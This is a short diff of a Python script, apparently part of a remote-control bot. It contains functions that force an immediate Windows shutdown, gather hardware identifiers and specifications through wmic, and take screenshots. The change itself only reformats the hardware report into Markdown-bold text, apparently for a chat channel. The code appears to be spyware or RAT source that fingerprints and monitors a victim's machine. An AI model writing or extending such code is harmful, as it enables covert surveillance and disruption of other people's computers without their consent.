@@ -40,12 +40,12 @@ def pc_shutdown():
   os.popen("shutdown /s /t 0")
 
 def hardware_info():
-  hwid = os.popen("wmic csproduct get uuid").read()
-  cpu = os.popen("wmic cpu get name").read()
-  gpu = os.popen("wmic path win32_VideoController get name").read()
-  ram = os.popen("wmic MemoryChip get Capacity").read()
-  disk_size = os.popen("wmic diskdrive get size").read()
-  return f"HWID: {hwid}\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\nDisk Size: {disk_size}"
+  hwid = os.popen("wmic csproduct get uuid").read().replace("\n", "").replace("UUID ", "")
+  cpu = os.popen("wmic cpu get name").read().replace("\n", "").replace("Name ", "")
+  gpu = os.popen("wmic path win32_VideoController get name").read().replace("\n", "").replace("Name ", "")
+  ram = os.popen("wmic MemoryChip get Capacity").read().replace("\n", "").replace("Capacity ", "")
+  disk_size = os.popen("wmic diskdrive get size").read().replace("\n", "").replace("Size ", "")
+  return f"**HWID: **{hwid}\n**CPU: **{cpu}\n**GPU: **{gpu}\n**RAM: **{ram}\n**Disk Size: **{disk_size}"
 
 def screenshot():
   ImageGrab.grab().save(f"{operation_dir}\\screenshot.png")
